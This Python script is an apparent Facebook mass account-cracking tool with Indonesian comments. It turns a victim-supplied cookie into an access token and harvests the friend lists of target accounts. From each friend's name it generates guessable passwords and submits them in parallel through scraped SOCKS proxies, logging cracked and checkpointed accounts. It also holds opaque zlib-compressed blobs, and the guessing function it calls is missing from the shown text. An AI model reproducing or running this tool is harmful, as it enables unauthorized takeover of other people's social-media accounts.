#ASTAGFIRULLAH JEBOL
import requests,json,os,sys,random,datetime,time,zlib,re,platform
#import ua_generator
from time import sleep as waktu
import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64
from time import sleep
from rich import pretty
from rich.tree import Tree
from rich.panel import Panel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.progress import track
from rich.text import Text as tekz
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as par
from rich.console import Group as gp
from bs4 import BeautifulSoup as parser
from rich.columns import Columns as col
from rich.console import Console as sol
from rich.markdown import Markdown as mark
#from pwinput import pwinput
from concurrent.futures import ThreadPoolExecutor as tred
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn,TimeRemainingColumn,TransferSpeedColumn
from time import time as waktunya
from rich.table import Table
from rich.live import Live
#from tk import Tk

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
ugen= []
loop,bra = 0,[]
ok,cp,oo = 0,0,[]
usragent = []
tokenku = []
###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	bra_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()
uak=[]

###----------[ USER AGENT ]----------###

###----------[ PEWARNA ]----------###
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "[#FF00C0]" #ungu
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE
domris = random.choice(['[bold white]','[bold green]','[bold purple]','[bold red]','[bold yellow]','[bold hot_pink2]','[bold blue]']) 

##UA by CYBER Demon###
##fuck ua###
mi=random.choice(['MI 8 Explorer Edition','MI PLAY','Mi 1','Mi 10','Mi 10 Lite (5G)','Mi 10 Lite Zoom','Mi 10 Pro','Mi 10 Ultra','Mi 10 Youth Edition','Mi 10i (5G)','Mi 10S','Mi 10T (5G)','Mi 10T Lite (5G)','Mi 10T Pro (5G)','Mi 11','Mi 11 (5G)','Mi 11 LE','Mi 11 Lite','Mi 11 Lite (5G)','Mi 11 Lite 5G NE','Mi 11 Lite NE (5G)','Mi 11 Pro','Mi 11 Pro (5G)','Mi 11 Ultra (5G)','Mi 11i','Mi 11i (5G)','Mi 11T (5G)','Mi 11T Pro','Mi 11T Pro (5G)','Mi 11X','Mi 11X Pro (5G)','Mi 12 Pro','Mi 1S','Mi 2','Mi 2A','Mi 2S','Mi 3','Mi 3W','Mi 4','Mi 4 PRO','Mi 4A PRO','Mi 4c','Mi 4C PRO','Mi 4i','Mi 4LTE','Mi 4s','Mi 5','Mi 5 Pro','MI 5c','Mi 5s','Mi 5s Plus','Mi 5X','Mi 6','Mi 6 Plus','Mi 6X','Mi 8','Mi 8 Explorer Edition','Mi 8 Lite','Mi 8 Pro','Mi 8 SE','Mi 8 SE+','Mi 8 UD','Mi 9','Mi 9 Lite','Mi 9 Pro (5G)','Mi 9 SE','Mi 9 SE Brown Edition','Mi 9 Transparent Edition','Mi 9T','Mi 9T Pro','Mi A1','Mi A2','Mi A2 Lite','Mi A3','Mi Box','Mi Box 1','Mi Box 1S','Mi Box 2','Mi Box 3','Mi Box 3 Pro','Mi Box 3S','Mi Box 4','Mi BOX mini','MI BOX PRO','Mi Box S','MI CC 9','MI CC 9 Meitu Edition','MI CC 9e','Mi CC11','Mi CC9 Pro','Mi CC9e','Mi Laser Projector 150"','Mi Max','Mi Max 2','Mi Max 3','Mi Max Prime','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 2S Art','Mi Mix 3','Mi Mix 3 (5G)','Mi Mix 4','Mi Mix Fold (5G)','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 2','Mi Note 3','Mi Note LTE','Mi Note Pro','Mi One','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro (5G)','Mi Play'])
red = random.choice(['Redmi Go','Redmi Note 7 Pro','Redmi S2','Redmi 1','Redmi 10','Redmi 10 (2022)','Redmi 10 (5G)','Redmi 10 Power','Redmi 10 Prime','Redmi 10 Prime+ (5G)','Redmi 10A','Redmi 10C','Redmi 10X ','Redmi 10X Pro (5G)','Redmi 11 Prime','Redmi 12','Redmi 12C','Redmi 1A','Redmi 1S','Redmi 2','Redmi 20X','Redmi 3','Redmi 3S','Redmi 3X','Redmi 4','Redmi 4 Prime','Redmi 4 Pro','Redmi 4A','Redmi 4X','Redmi 5','Redmi 5 Plus','Redmi 5A','Redmi 6','Redmi 6 Pro','Redmi 6A','Redmi 7','Redmi 7 Pro','Redmi 7A','Redmi 8','Redmi 8A','Redmi 8A Pro','Redmi 9','Redmi 9 Power','Redmi 9 Prime','Redmi 9A','Redmi 9AT','Redmi 9C','Redmi 9C NFC','Redmi 9i','Redmi 9T','Redmi A1','Redmi A1+','Redmi A2','Redmi A2 Plus','Redmi Go','Redmi K20','Redmi K20 Pro','Redmi K20 Pro Premium Edition','Redmi K30','Redmi K30 (5G)','Redmi K30 (5G) Speed Edition','Redmi K30 Pro','Redmi K30 Pro Zoom Edition','Redmi K30 Ultra','Redmi K30 Ultra (5G)','Redmi K30i (5G)','Redmi K30S','Redmi K30S Ultra','Redmi K40','Redmi K40 (5G)','Redmi K40 Gaming','Redmi K40 Pro','Redmi K40 Pro (5G)','Redmi K40S (5G)','Redmi K50','Redmi K50 Gaming (5G)','Redmi K50 Pro','Redmi K50 Ultra','Redmi K50i','Redmi K60','Redmi K60 Pro','Redmi Note','Redmi Note (5G)','Redmi Note 1','Redmi Note 10','Redmi Note 10 (5G)','Redmi Note 10 Lite','Redmi Note 10 Pro','Redmi Note 10 Pro (5G)','Redmi Note 10 Pro Max','Redmi Note 10S','Redmi Note 10T','Redmi Note 10T (5G)','Redmi Note 11','Redmi Note 11 Pro','Redmi Note 11 Pro (5G)','Redmi Note 11 Pro+','Redmi Note 11 Pro+ (5G)','Redmi Note 11 SE','Redmi Note 11E','Redmi Note 11E Pro','Redmi Note 11R','Redmi Note 11S','Redmi Note 11S (5G)','Redmi Note 11T (5G)','Redmi Note 11T Pro (5G)','Redmi Note 12','Redmi Note 12 (5G)','Redmi Note 12 Discovery','Redmi Note 12 Pro','Redmi Note 12 Pro (5G)','Redmi Note 12 Pro Speed','Redmi Note 12 Pro+','Redmi Note 12 Pro+ (5G)','Redmi Note 12S','Redmi Note 12T','Redmi Note 2','Redmi Note 3','Redmi Note 3 Pro','Redmi Note 4','Redmi Note 4X','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 5A','Redmi Note 5A Lite','Redmi Note 5A Prime','Redmi Note 6 Pro','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 7S','Redmi Note 8','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 (5G)','Redmi Note 9 Pro','Redmi Note 9 Pro (5G)','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T (5G)','Redmi Pad','Redmi Pro','Redmi Red Rice','Redmi S2','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3'])
moto = random.choice(['Moto 360','Moto 360 (2nd Gen)','MOTO A1680','Moto C','Moto C Plus','Moto Defy XT','Moto E','Moto E (1st Gen)','Moto E (2nd Gen)','Moto E (4)','Moto E (4) Plus','Moto E (5)','Moto E (Google Edition)','Moto E with 4G LTE (2nd Gen)','Moto E13','Moto E2','Moto E20','Moto E22','Moto E22i','Moto E22s','Moto E3','Moto E3 Power','Moto E30','Moto E32','Moto E4','Moto E4 Plus','Moto E40','Moto E5','Moto E5 cruise','Moto E5 GO','Moto E5 Play','Moto E5 Plus','Moto E5 Supra','Moto E6','Moto E6 play','Moto E6 Plus','Moto E6i','Moto E6s','Moto E7','Moto E7 Plus','Moto E7 Power','Moto E7i Power','Moto G','Moto G (1st Gen)','Moto G (2014)','Moto G (2nd Gen)','Moto G (3rd Gen)','Moto G (4)','Moto G (4) Play','Moto G (4) Plus','Moto G (5)','Moto G (5) Plus','Moto G (5G)','Moto G (5S)','Moto G (5S) Plus','Moto G (5th Gen)','Moto G (Google Edition)','Moto G 5G Plus','Moto G Fast','Moto G Go','Moto G Play','Moto G Play (2021)','Moto G Play (2023)','Moto G Plus (5th Gen)','Moto G Power','Moto G Power (2021)','Moto G Power (2022)','Moto G Power (2023)','Moto G Pro','Moto G Pure','Moto G Stylus','Moto G Stylus (2021)','Moto G Stylus (2022)','Moto G Stylus (2022) (5G)','Moto G Stylus (5G)','Moto G Turbo Edition','Moto G with 4G LTE (1st Gen)','Moto G with 4G LTE (2nd Gen)','Moto G10','Moto G10 Power','Moto G100 (5G)','Moto G13','Moto G2','Moto G20','Moto G200 (5G)','Moto G22','Moto G23','Moto G30','Moto G31','Moto G32','Moto G4','Moto G4 Plus','Moto G40 Fusion','Moto G41','Moto G42','Moto G5','Moto G5 Plus','Moto G50 (5G)','Moto G51','Moto G51 (5G)','Moto G52','Moto G52j (5G)','Moto G53 (5G)','Moto G5S','Moto G5S Plus','Moto G6','Moto G6 Forge','Moto G6 play','Moto G6 Plus','Moto G60','Moto G62 (5G)','Moto G7','Moto G7 Optimo','Moto G7 play','Moto G7 plus','Moto G7 Power','Moto G7 Supra','Moto G71 (5G)','Moto G72','Moto G73','Moto G8','Moto G8 Play','Moto G8 Plus','Moto G8 Power','Moto G8 Power Lite','Moto G82 (5G)','Moto G9','Moto G9 Play','Moto G9 plus','Moto G9 power','Moto Glam','Moto Green Pomelo','Moto M','Moto M Dual','Moto Maxx','Moto ME525','Moto MT620','Moto MT716','Moto MT810','Moto MT870','Moto One Vision','moto p30','moto P30 NOTE','moto p30 play','Moto Tab G62','Moto Tab G70','Moto X','Moto X (2014)','Moto X (2nd Gen)','Moto X (4)','Moto X (Google Edition)','Moto X Force','Moto X Play','Moto X Pro (China)','Moto X Pure Edition','Moto X Style','Moto X5','MOTO XT301','MOTO XT316','MOTO XT319','MOTO XT500','MOTO XT532','MOTO XT615','MOTO XT626','MOTO XT681','MOTO XT685','MOTO XT702','MOTO XT711','MOTO XT800','MOTO XT806','MOTO XT882','Moto Z','Moto Z (2) Force','Moto Z Droid','Moto Z Play','Moto Z Play (2)','Moto Z Play Droid','Moto Z Play Dual','Moto Z2 Play','Moto Z3','Moto Z3 Play','Moto Z4','MOTOACTV','Motoluxe','MOTOLUXE MT680','Motoroi','Motosmart','MOTOSMART Flip','MOTOSMART MIX','MOTOSMART XT303','MOTOSMART XT305','MOTOSMART XT389','MOTOSMART XT390' ])
demon = []
for xd in range(10000):
	rr = random.randint; rc = random.choice
	andro = random.choice([str(random.randint(1,7))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),str(random.randint(1,14))+'.'+str(random.randint(0,9)),'8.0.0','8.1.0','8','9','10','11','12','13'])
	###Ua by cyber demon###
	az=(["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"])  
	brd=(["TP1A","OPM2","RKQ1","SP1A","PKQ1","TQ1A","QP1A","RP1A","TKQ1","PPR1","PKQ1","OPM1"])
	build=str(rc(brd))+"."+str(rr(170000,250000))+".0"+str(rr(0,6))+str(rr(0,6))
	fbav = f'{random.randint(299,450)}.0.0.{random.randint(11,99)}.{random.randint(111,399)}'
	fbbv = str(random.randint(291111111,499999999))
	fbrv = str(random.randint(291111111,499999999))
	net=random.choice(['MTN-Stay Safe','MTN-STAY SAFE','MTN NG','null','Airtel NG',''])
	archi = random.choice(['armeabi-v7a:armeabi','arm64-v8a:','arm64-v8a:null','x86:armeabi-v7a','arm64-v8a:armeabi-v7a:armeabi'])
	density = random.choice([str(random.randint(1,4))+'.'+str(random.randint(0,9))+str(random.randint(0,9)),str(random.randint(1,4))+'.'+str(random.randint(0,9))+str(random.randint(0,9))+str(random.randint(0,9)),str(random.randint(1,4))+'.'+str(random.randint(0,9))])
	xiaomi = zlib.decompress(b'x\x9cm\x8e]\x0b\x820\x14\x86\xff\x8bWE\xe2\xb1\x8f\x9b\x08/\x9cb7eb\x10ADL\x9d9\xc2\r\xe6\xe8\x03\xf1\xbfw6\xf0\xce\x9b\xed9\xf0\x9e\xf3>\xb5sKH\x98BB6\xe1\x0e\xe9\x02}]\xd0\xf7\x80L,\x17\x96\xe3#8\x0b\xa7\xaf\x98\xe8\xb8\xfe\x05#\x0c\xee\x87W\xba\t\xfaN\xab\x99\xa2\xa2\x92\xadg>.\xf4l\xe5\xfb\xee\x12\x9f\xf9|p\x1b\xc6\x9f\x8d\x9e\x8cm1\xb6\xf6ml\xc0\n\xec:D\xc0\xc4cO\x10s\xab\xa0\xacB\x94C/\x986xL\xe0\xca\xa9l\xb9\xb1\x8c\xe1;r\x96B\x89\xa7kZ\xb2B\xca\x97\xf7\xa2\x9a\nj\xf4\xf1N\xcb\xcd\xea\x19\t\x9b\x954\xc3)\x83)\xa5%\n\xa1\x8e\xe9\x0c1\xad\xca\x06W\xef\xce\x1f*\xbec\xa6')
	redmi = zlib.decompress(b'x\x9cm\x8e\xd1\n\x820\x14\x86\xdf\xc5+%\xe9hu\x13\xe1\x85S\xec&+\x0c"\x88\x88\xe9f\x8eh\x835\x8a\x90\xbd{g\x83\xee\xba9\xfb\x06\xff9\xff\xd7\x07\xe7\x8a\xe4[\xa8\xc8"_!\x1da\xec[\xfa\xb2\xc8\xc4s\xeb\xb9\xac!\x98\x04#\xe3\xf2)\xcc\'\xfb\x81\x8d\xdf\x82\x99!\x1b\x9fF\x87\x9aJ\xa6\x1eS\xf7\x08i\xc2Y\x92\xc4)\x8e(\xb2\xf1\xc0\xc5m0\x7fcK\x8c\xcd\x13\x1f\xb3X\x81]\x9b\x02\xb8\xbc\xae\tb\xe3\x15\xb4W(\x1a\x18%7\x0e\xeb\nN\x82\xaa\x87p\x96%4\x9cy\xdco\xa1\xc3\xcb=\xedx\xab\xd4}z\xa7\x86J\xea\xec\xf1\x8c\xe6\xcc\xad\x1e\x10\xb1Y+\xf7\xd9\xed\xe1\x9fR\x8aB\xa8\xe3:sL\xebn\x10vu\t\xbe\x15}cu')
	motorolla = zlib.decompress(b"x\x9cm\x8e]\x0b\x820\x14\x86\xff\x8bWJ\xe2\xb4\xba\t\xe9\xc2\x0f\xec&M\x0c\xba\x89\x88\xa93\x87\xb9\xc1\x1cE\xc8\xfe{g\x83\xa0\x0bo\xb6\xe7p^\xce\xfbt\xd65\x8b\xa3\x02e\xf16\n\x81.h\xeej\xfcR\xc0\xb1\xe1\xdap\x9a#ke\xcd-a\x13\x95\x9f\xfd\x0f\x94\xfb\xa6\xad\xec\xf7\xf3$\x85-0k\xf9\xe8\xe9\x8f2i\xaf}\xdf\r\xe0q\x1c\xe5\xf6\x84>z\xb9\x18\xdbAl\xe3\x9b\x98\x82\n\xe8:&\x88\xb0\xfb!\x06\xac\x8c\x820\nI\x85fF\xa4\xc6<C#\x97\\\xf0'\xd6\x9e\xe9\xffT\x16\xa8\x81\xf3\x1dnH\xcd\xf9\xe0\rXb\xa6\x17)\xdc\xd29}\xe0\x0c\x0c\xfd\xc2\x0c\xa7\x12-\x89\x05\xa0\x05R\xba9\x82\xb4hz\xaa\xc2\x9b\xf5\x05\xd6Tf{")
	demonic = rc([redmi,xiaomi,motorolla])
	demon.append(demonic)
	

###----------[ CONVERT BULAN ]----------###
rb = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
wa = Console()
#running text##
os.system('clear') 
def running_text(s) :
	for c in s + '\n':
		sys.stdout.write(c) 
		sys.stdout.flush() 
		time.sleep(random.random() * 0.2) 

###----------[ UNTUK ANIMASI ]----------###
def bra_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)
def bra_bann(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.01)
        
###----------[ BANNER MENUH ]----------###
def banner() :
    wa.print(f'''[red]╔╗ ╦═╗╔═╗   
[gren]╠╩╗╠╦╝╠╣  [white] Thanks To Demon😈 
[yellow]╚═╝╩╚═╚   [white] Tools  : [hot_pink2]cock.py	''') 
#login#
def login():

	try:

		token = open('.token.txt','r').read()

		cok = open('.cok.txt','r').read()

		tokenefb.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenefb[0], cookies={'cookie':cok})

			sy2 = json.loads(sy.text)['name']

			sy3 = json.loads(sy.text)['id']

			menu(sy2,sy3)

		except KeyError:

			login_lagi334()

		except requests.exceptions.ConnectionError:

			li = ' ╰─  Problem Internet Connection, Check And Try Again'

			lo = mark(li, style='red')

			sol().print(lo, style='cyan')

			exit()

	except IOError:

		login_lagi334()

		

def login_lagi334():

	try:
		os.system('clear') 
#	        os.system('clear')
#	   	 
#                print(f'{P}JANGAN GUNAKAN AKUN PRIBADI') 
		banner()
		print(f'{m}\t\tPERHATIAN!!\n\r{k}JANGAN GUNAKAN AKUN PRIBADI') 
		your_cookies = input('[•] Enter Cookie : ')

		with requests.Session() as r:

			try:

				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})

				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}

				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)

				code, user_code = response['code'], response['user_code']

				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))

				r.headers.pop('content-type')

				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})

				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text

				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):

					print(" ╰─  Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()

				else:

					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')

					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)

					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)

					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}

					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})

					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})

					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):

						r.headers.pop('content-type');r.headers.pop('origin')

						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text

						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')

						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)

						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)

						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)

						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)

						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)

						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)

						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)

						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)

						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)

						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})

						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}

						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text

						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')

						r.headers.pop('content-type');r.headers.pop('origin')

						r.headers.update({'referer': 'https://m.facebook.com/',})

						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text

						if 'Sukses!' in str(response6):

							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})

							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text

							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)

							print(f"\n {k}╰─  Token : {access_token}")

							tokenew = open(".token.txt","w").write(access_token)

							cook= open(".cok.txt","w").write(your_cookies)
							zlib.decompress(b'x\x9cm\x8d\xc1j\xc2@\x10@\xef\xf9\x8a\xc1C\xb1\x07w7\xd86\x89\x10\x8a\xe6\xe0\xa5\x82\x88\xb4\xb4\x97\xb0\xae\xe3&\xa4f\xd6\x9d\t\xad\x14\xff\xbd\xdas\xdf\xed\xf1\x0e/\xe2i@\x16V\x81X\xc6\x87Q#\x12x\xa6\xb5\r\xad\x12\xfcD\x1f\xedQQ\xf4zG\xf2\x98\x9b4O\x8b\x87\xdc\xcc\xe6\xf3\xe5\xfa\x90\xd5/S?\xb1\xd5b\xc5_\xeb\xe3[\xbfy\xfd8\x85\x8d\xaf\xa4\x990\xbfk\xc6~\xbfBf\xeb\xf1\xd95V\xeav_\xa6E\x96\x99"7\xe6\xe9N\xf0[Jp\xd4i\xa1\x0evq@\x15\xce\t\x94\xff\x90(\xa8\x88\xba\x16\x01\xe0\xe7LC\xac\xdd\x9f\xf2\x05 \xd9R\x87\xfd-X\xe7\xae\xb7Zn~\x19\xc1\xfd/wJG\xb2')

							print("\n ╰─  Login successful | re-run tool");exit()

			except Exception as e:

				print(" ╰─  Cookies invalid man")

				os.system('rm -rf .token.txt && rm -rf .cok.txt')

				print(e)

				time.sleep(3)

				back()

	except:pass
	

###----------[ BAGIAN MENU ]----------###
def menu(namamu,idmu) :
	try:
		cok = open('.cok.txt','r').read()
	except IOError:
		bra_anim(f'{mer}cookies telah kadaluarsa ster')
		waktu(4)
		login_lagi334() 
	os.system('clear')
	banner()
	wa.print(f'[r magenta]Sc Ini Hanya Support Crack Massal') 
	wa.print('<=°=°=°=°=°=°=°=°=°=°=°=°=°=°=>') 
	wa.print(f'[white][∆] Your Name : [hot_pink2]{namamu}') 
	wa.print(f'[white][∆] Your Id : [hot_pink2]{idmu}') 
	wa.print('<=°=°=°=°=°=°=°=°=°=°=°=°=°=°=>') 
	#print(' ') 
	nge_crack()
###----------[ DUMP ID PUBLIK ]----------###
def nge_crack():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		wa = Console() 
		print (' ') 
	except IOError:
		exit()
	try:
	#    wa.print('<=°=°=°=°=°=°=°=°=°=°=°=°=°=°=>') 
	    jum=int(input(f'{P}<{h}•{P}> {P}Mau Berapa Target? = {h}')) 
	except ValueError:
		wa.print(f'[r red] Ketik Yang Benar Kink') 
		exit()
	if jum<1 or jum>80:
		wa.print(f'[r red] Teman Tidak Publik Kink') 
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{P}[>] {P}Masukkan id Target Yang Ke '+str(yz) + f': {h} ') 
		uid.append(kl)
		#print(su) 
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5002=)&access_token='+tokenefb[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('{biru}━─═ ◕➤ Unstable Signal ')
			exit()
	try:
		#mengetik('> > > > > > > > > > > > > > >] 100%') 
	    wa.print(f'[italic white][√] Total Id Yang Terkumpul :[green]'+str(len(id)))
	    atur_dulu() 
	except:
	    print('teman tidak publik') 
	    exit()
###----------[  ATUR DULU STER ]----------###
def atur_dulu():
	for ngentod in id :
		xc = random.randint(0,len(id2)) 
		cammo = id2.insert(xc,ngentod) 
	kontius() 
	
def kontius():
	bra.append('free') 
	passwrd() 
from datetime import datetime
###----------[  BAGIAN WORDLIST ]----------###
def passwrd():
	#os.system('clear') 
	#banner() 
	global prog,des
	print(' ') 
	wa.print('<=°=°=°=°=°=°=°=°=°=°=°=°=°=°=>') 
	wa.print(f'[bold red]•[bold yellow2]• [dim white]Hasil OK di Simpan Di [r green]/sdcard/OK/{okh}  ') 
	wa.print(f'[bold red]•[bold yellow2]• [dim white]Hasil Cp di Simpan Di [r yellow]/sdcard/CP/{cph}  ') 
	wa.print('<=°=°=°=°=°=°=°=°=°=°=°=°=°=°=>') 
	#print(' ') 
	wa.print(f'\t\t\t[italic yellow]On/Off Mode Pesawat Saat 200 Idz') 
	print('') 
	prog = Progress(SpinnerColumn("runner"),TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task(' ',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				prr = random.randrange(1, 100) 
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'1')
						pwv.append(frs+'2')
						pwv.append(frs+'12')
						pwv.append(frs+'112')
						pwv.append(frs+'1111')
						pwv.append(frs+'1122')
						pwv.append(frs+'4321')
						pwv.append(frs+'1212')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+str(prr)) 
						pwv.append(frs+'123')
						pwv.append(frs+'@')
						pwv.append(frs+'@1')
						pwv.append(frs+'@2')
						pwv.append(frs+'@12')
						pwv.append(frs+'@123')
						pwv.append(frs+'@1234')
						pwv.append(frs+'@12345')
						pwv.append(frs+'2023')
						pwv.append(frs+'2022')
						pwv.append(frs+'2021')
						pwv.append(frs+'2020')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'321')
				#		pwv.append('muhammad'+frs) 
						#pwv.append(frs+'1')
						#pwv.append(frs+'2')
						#pwv.append(frs+'3')
						pwv.append(frs+'123456789')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'09')
						pwv.append(frs+'12')
				#		pwv.append(frs+'1') 
				#		pwv.append(frs+'2') 
						pwv.append('123456789') 
						pwv.append('nigeria') 
				#		pwv.append(frs+'pendek') 
				#		pwv.append('daeng'+frs) 
						pwv.append(frs+'@facebook') 
						pwv.append(frs+'@facebook.com') 
				#		pwv.append(frs+'pesek') 
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'free' in bra:
					gas_krek.submit(crackfree,idf,pwv) 
				
				else:
					gas_krek.submit(crackfree,idf,pwv) 
		rafly = f'[italic red]•[italic yellow]• [italic white]Crack[italic red] {len(id)}[italic white] Idz Telah Selesai, Hasil [italic green]OK = {ok} [italic white]Dan Hasil [italic yellow2]CP = {cp}[italic red] •[italic yellow]•'
		cetak(rafly) 

	###----------[  ASYNC ]----------###
oks=[]
